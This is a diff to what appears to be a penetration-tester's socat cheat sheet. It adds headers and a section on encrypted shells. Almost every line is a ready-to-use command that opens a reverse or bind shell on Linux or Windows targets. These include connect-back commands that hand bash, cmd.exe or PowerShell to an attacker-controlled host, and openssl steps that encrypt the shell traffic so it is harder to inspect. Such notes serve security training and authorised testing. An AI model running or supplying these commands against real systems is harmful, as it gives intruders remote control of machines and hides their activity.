@@ -1,5 +1,6 @@
 Socat - Connector between two points
 
+################ LISTENERS ################
 Reverse Shell Listener:
   socat TCP-L:<PORT> -
               Basic reverse shell listener
@@ -11,7 +12,7 @@ Bind Shell Listener:
   socat TCP-L:<PORT> EXEC:powershell.exe,pipes
               Bind shell listener on a Windows target
 
-
+################ CONNECTIONS ################
 Reverse Shell Connection:
   socat TCP:<LOCAL_IP>:<LOCAL_PORT> EXEC:powershell.exe,pipes
               Connection back to the reverse shell listener on a Windows target
@@ -19,6 +20,38 @@ Reverse Shell Connection:
 Bind Shell Connection:
   socat TCP:<TARGET_IP>:<TARGET_PORT> -
               Connection to the bind shell listener on a Linux/Attacker target
+
+################ ENCRYPTED COMMUNCIATION ################
+Socat Encrypted Reverse Shel Communication:
+  openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+              Generate a certificate in order to use encrypted shells
+  cat shell.key shell.crt > shell.pem
+              Merge the two created files into a single .pem file
+  socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+              Set up reverse shell OPENSSL listener using our generated certificate
+              verify=0 tells the connection to not bother trying to validate that our
+              certificate has been properly signed by a recognised authority
+              Please note that the certificate must be used on whichever device is listening
+  socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+              Connect back on the target Linux machine
+
+Informational:
+The same technique for an socat encrypted shells would apply for a bind shell:
+  socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+              Target machine
+  socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
+              Attacker machine, again, note that even for a Windows target, the certificate must be
+              used with the listener, so copying the PEM file across for a bind shell is required
+
+
+
+
+
+
+
+
+
+
 
 Informational:
   rlwrap (technique is especially usefull when dealing with Windows shells)
